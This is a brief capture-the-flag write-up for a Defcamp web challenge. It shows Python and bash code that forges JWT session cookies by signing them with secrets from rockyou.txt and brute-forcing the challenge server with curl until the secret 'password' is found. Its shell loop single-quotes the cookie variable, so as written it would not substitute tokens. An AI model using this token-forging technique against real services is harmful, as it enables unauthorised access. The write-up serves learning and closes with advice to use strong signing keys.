# Defcamp CTF Writeup
Another singular writeup ... Oh well I'm still learning, the other challenges were rather complex but reading solutions was quite interesting.

## Problem
Upon visiting the provided URL, we are presented initially with an "Access denied" html page.

After checking the html, I perused session storage and found a cookie in the form of a JWT.

It got shoved into jwt.io and the payload was b64-encoded json struct.

```js
{
    "logged_in":"false"
}
```
I changed the polarity of the boolean and tried again, and got some fun flask errors. Fun, flask backend.

I grabbed pyjwt and modified the example code to fit my purposes

```python
payload_data = {
    "logged_in": "true",
}

token = jwt.encode(
    payload=payload_data,
    key=secret
)
```

Since the secret was unknown to me, i decided to try brute-forcing with (some of) `rockyou.txt`

```python
secrets = open("rockyou.txt", 'r').readlines()[:-50]
f = open("tokens.txt", "w+")

for secret in secrets:
    token = jwt.encode(
        payload=payload_data,
        key=secret
    )
    f.write(token + "\n")

```


I then wrote a bash script to enumerate the tokens I generated (janky, i know, but it worked)

```bash
lines=$(cat tokens.txt)
for line in $lines          
do
        curl -v -s -k "GET" --cookie 'session=$line' 'http://34.89.146.147:32555/'
done
```

I tested the script to stdout for a few seconds, then get grepped for "CTF" and got the flag after 4 tries (the secret was `'password'`).

## What I learned
JWT is pronounced "jot", and secure keys should be used for signing everything because bruteforcing passwords is trivial.

